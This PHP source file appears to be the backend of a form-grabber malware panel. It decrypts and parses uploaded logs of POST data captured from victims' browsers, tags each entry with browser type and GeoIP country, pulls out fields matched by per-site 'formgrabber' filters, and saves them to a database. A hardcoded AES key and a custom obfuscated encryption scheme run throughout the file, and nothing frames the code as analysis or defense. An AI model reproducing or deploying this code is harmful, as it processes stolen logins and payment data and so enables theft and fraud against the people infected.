<?php

if(!function_exists('generatePassword')){
	function generatePassword ($length = 8){
		$password = '';
		$possible = "0123456789aAbBcCdDfFgGhHjJkKmMnNpPqQrRsStTvVwWxXyYzZ";
		$i = 0;
		while ($i < $length){
			$char = substr($possible, mt_rand(0, strlen($possible)-1), 1);
			if (!strstr($password, $char)) {
				$password .= $char;
				$i++;
			}
		}
		$password = str_replace('BJB', 'JBJ', $password);
		return $password;
	}
}
/*
if(!function_exists('save_iddb')){
	function save_iddb($t, $filters, $var){
		global $dir;
		file_put_contents($dir['site'] . 'cache/iddb/'.$filters[$var[0]['host']]['id'].'_'.$var[0]['host'].'.txt', $t . "\r\n\r\n", FILE_APPEND);
	}
}
*/
$rc = array();
$rc['key'] = 'TnqbwNDcXdYFEw1Bh3j1ba2yC305aRAP';
$rc_key = $rc['key'];

if(!function_exists('rc_encode_aes')){
	function rc_encode_aes($str, $key = ''){
		global $rc;
		if(empty($key)) $key = $rc['key'];
		$iv = generatePassword(16);
		$data = openssl_encrypt($str, 'AES-256-CBC', $key, false, $iv);
		if(strpos($data, '==') !== false){
			return substr($iv, 0, 8) . substr($data, 0, strlen($data)-2) . substr($iv, 8, 16) . '==';
		}elseif(strpos($data, '=') !== false){
			return substr($iv, 0, 8) . substr($data, 0, strlen($data)-1) . substr($iv, 8, 16) . '=';
		}else{
			return substr($iv, 0, 8) . $data . substr($iv, 8, 16);
		}
	}
}

if(!function_exists('rc_decode_aes')){
	function rc_decode_aes($str, $key = ''){
		global $rc;
		if(empty($key)) $key = $rc['key'];
		$str = str_replace(' ', '+', $str);
		if(strpos($str, '==') !== false){
			$iv = substr($str, 0, 8) . str_replace('==', '', substr($str, strlen($str)-10, strlen($str)-8));
			return openssl_decrypt(substr($str, 8, strlen($str)-18) . '==', 'AES-256-CBC', $key, false, $iv);
		}elseif(strpos($str, '=') !== false){
			$iv = substr($str, 0, 8) . str_replace('=', '', substr($str, strlen($str)-9, strlen($str)-7));
			return openssl_decrypt(substr($str, 8, strlen($str)-17), 'AES-256-CBC', $key, false, $iv);
		}else{
			//$iv = substr($str, 0, 8) . substr($str, strlen($str)-8, strlen($str)-6);
			$iv = substr($str, 0, 8) . substr($str, strlen($str)-8, strlen($str));
			return openssl_decrypt(substr($str, 8, strlen($str)-16), 'AES-256-CBC', $key, false, $iv);
		}
	}
}
print(size_format(strlen($log)) . "\r\n");
$log = explode("[~]\r\n\r\n", $log);

$var = array();

if(isset($log[0])){
	foreach($log as $item){
		$var[0] = explode("[,]\r\n", $item);
		if(count($var[0]) >= 5){
			if(strlen($var[0][4]) > 10240) continue;
			
			$var[0][4] = explode('|POST:', $var[0][4], 2);
			
			if(empty($var[0][4][0])) continue; // ссылка
			if(empty($var[0][4][1])) continue; // пост данные
			
			$var[0][4][0] = trim($var[0][4][0], "\r\n");
			$var[0][4][1] = trim($var[0][4][1], "\r\n");
			
			if(stripos($var[0][4][0], 'http://') === 0){
				$var[0]['host'] = get_host($var[0][4][0]);
				$var[0]['port'] = @parse_url(str_replace(' (cPanel)', '', $var[0][4][0]), PHP_URL_PORT);
			}elseif(stripos($var[0][4][0], 'https://') === 0){
				$var[0]['host'] = get_host($var[0][4][0]);
				$var[0]['port'] = @parse_url(str_replace(' (cPanel)', '', $var[0][4][0]), PHP_URL_PORT);
			}elseif(stripos($var[0][4][0], 'site://') === 0){
				$var[0][4][0] = str_replace('site://', 'http://', $var[0][4][0]);
				$var[0]['host'] = get_host($var[0][4][0]);
				$var[0]['port'] = @parse_url(str_replace(' (cPanel)', '', $var[0][4][0]), PHP_URL_PORT);
			}else{
				$var[0]['host'] = get_host($var[0][4][0]);
				$var[0]['port'] = @parse_url(str_replace(' (cPanel)', '', 'http://' . $var[0][4][0]), PHP_URL_PORT);
			}
			
			if(empty($var[0]['host'])) continue;
			
			if($var[0][3] == '1'){
				$var[0]['b'] = 'InternetExplorer';
			}elseif($var[0][3] == '2'){
				$var[0]['b'] = 'MozillaFirefox';
			}elseif($var[0][3] == '3'){
				$var[0]['b'] = 'Opera';
			}else{
				$var[0]['b'] = 'Unknow';
			}

			if($geoip_ex != true){
				$var[0]['country'] = geoip_country_code_by_name($var[0][2]);
			}else{
				if(file_exists($dir['site'] . '/cache/geoip/')) $var[0]['country'] = geoip_country_code_by_addr($gi, $var[0][2]);
			}
			if(empty($var[0]['country'])) $var[0]['country'] = 'UNK';
			
			$var[0]['host_pre'] = mb_substr($var[0]['host'], 0, 2, 'utf8');
			if(!preg_match('~^([a-zA-Z0-9]+)$~', $var[0]['host_pre'])) $var[0]['host_pre'] = 'none';
			
			if(isset($filters[$var[0]['host']]) && !empty($filters[$var[0]['host']]['fields']['formgrabber'][1]) && !file_exists($dir['site'] . 'cache/fdi/' . $thread->post_id . '_' . $filters[$var[0]['host']]['id'])){
				$var[1] = count($filters[$var[0]['host']]['fields']['name']);
				if($var[1] > 0){
					//save_iddb($var[0][4][1], $filters, $var);
					$false = false;
					
					$add_sql = array();
					
					@mb_parse_str($var[0][4][1], $output);
					$output = array_change_key_case_unicode($output, CASE_LOWER);
					//save_iddb(print_r($output, true), $filters, $var);
					
					for($i = 1; $i <= $var[1]; $i++){
						if(!empty($filters[$var[0]['host']]['fields']['formgrabber'][$i])){								
							$var[2] = explode('|', $filters[$var[0]['host']]['fields']['formgrabber'][$i]);
							//save_iddb('COUNT_VAR2: ' . count($var[2]), $filters, $var);
							if(count($var[2]) > 0){
								foreach($var[2] as $data){
									if(!empty($data)){
										if(strpos($data, ',') != false){
											$var['3a'] = explode(',', $data);
											if(count($var['3a']) > 0){
												foreach($var['3a'] as $data_a){
													$data_a = mb_strtolower($data_a, 'UTF-8');
													if(strpos($data_a, '^') === 0){
														$data_a = str_replace('^', '', $data_a);
														foreach($output as $ke => $ou){
															if(stripos($ke, $data_a) === 0) $add_sql[$i] .= $ou;
														}
													}else{
														if(isset($output[$data_a])){
															$add_sql[$i] .= $output[$data_a];
														}elseif(stripos($data_a, 'TEXT:') === 0 && !empty($add_sql[$i])){
															$add_sql[$i] .= str_ireplace('TEXT:', '', $data_a);
														}
													}
												}
											}else{
												//save_iddb('EMPTY_3A!', $filters, $var);
											}
										}else{
											$data_a = mb_strtolower($data, 'UTF-8');
											if(strpos($data_a, '^') === 0){
												$data_a = str_replace('^', '', $data_a);
												foreach($output as $ke => $ou){
													if(stripos($ke, $data_a) === 0){
														$add_sql[$i] .= $ou;
														break 1;
													}
												}
											}else{
												if(isset($output[$data_a])){
													$add_sql[$i] .= $output[$data_a];
												}elseif(stripos($data_a, 'TEXT:') === 0 && !empty($add_sql[$i])){
													$add_sql[$i] .= str_ireplace('TEXT:', '', $data_a);
												}
											}
										}
									}else{
										//save_iddb('EMPTY_DATA!', $filters, $var);
									}
								}
							}else{
								$add_sql = array();
								break 1;
							}
						}
					}
					
					//save_iddb(count($add_sql) . ' - ' . $var[1], $filters, $var);
					
					if(count($add_sql) == $var[1]){
						add_item_new($filters[$var[0]['host']]['id'], array($var[0][0], $var[0][1], $var[0]['country'], $var[0]['b']), $add_sql);
					}
					
					//save_iddb(print_r($add_sql, true) . "\r\n\r\n----------------------------------", $filters, $var);
				}
			}
		}
	}
}

?>